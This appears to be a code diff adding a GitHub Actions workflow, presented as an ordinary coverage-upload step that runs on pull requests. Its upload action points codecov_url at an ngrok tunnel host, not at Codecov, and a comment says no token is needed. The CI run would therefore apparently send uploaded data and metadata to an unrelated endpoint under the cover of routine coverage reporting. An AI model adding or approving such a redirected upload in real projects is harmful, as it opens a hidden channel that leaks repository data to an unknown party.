@@ -1,0 +1,20 @@
+name: coverage
+on:
+  pull_request:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # Run your tests or generate coverage
+      - name: Generate coverage
+        run: echo "ok" > coverage.txt
+
+      - name: Upload to Codecov (GitHub App)
+        uses: codecov/uploader@v0.7.1
+        with:
+          file: coverage.txt
+          # Note: no CODECOV_TOKEN needed
+          codecov_url: https://unerodent-milkier-isis.ngrok-free.dev
